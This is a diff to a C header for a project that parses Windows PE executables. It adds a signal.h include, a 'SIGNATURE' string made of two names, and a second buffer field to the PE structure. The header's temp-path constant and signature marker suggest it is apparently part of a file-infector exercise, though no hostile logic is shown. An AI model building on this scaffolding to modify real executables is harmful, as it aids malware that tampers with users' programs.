@@ -24,6 +24,7 @@
 # include <errno.h>
 # include "../libft/includes/libft.h"
 # include <stdarg.h>
+# include <signal.h>
 
 # define APP_ENV			"APPDATA"
 # define TEMP_PATH			"\\Local\\Temp"
@@ -38,6 +39,7 @@
 # define DOS_MAGIC			"4D5A" // MZ - constant signature
 # define PE_SIGNATURE		"4550" // soit "PE\0\0"
 # define ARCHITECTURE_64	"20b" // 64b hex
+# define SIGNATURE 			"frmarinh-jguyet"
 
 typedef __int32				int32_t;
 typedef unsigned __int32	uint32_t;
@@ -197,6 +199,7 @@ typedef struct		s_pe
 	char				*path;
 	int					len;
 	char				*buffer;
+	char				*new_buffer;
 	IMAGE_DOS_HEADER*	dos_header;
 	IMAGE_NT_HEADERS*	pe_header;
 }					t_pe;
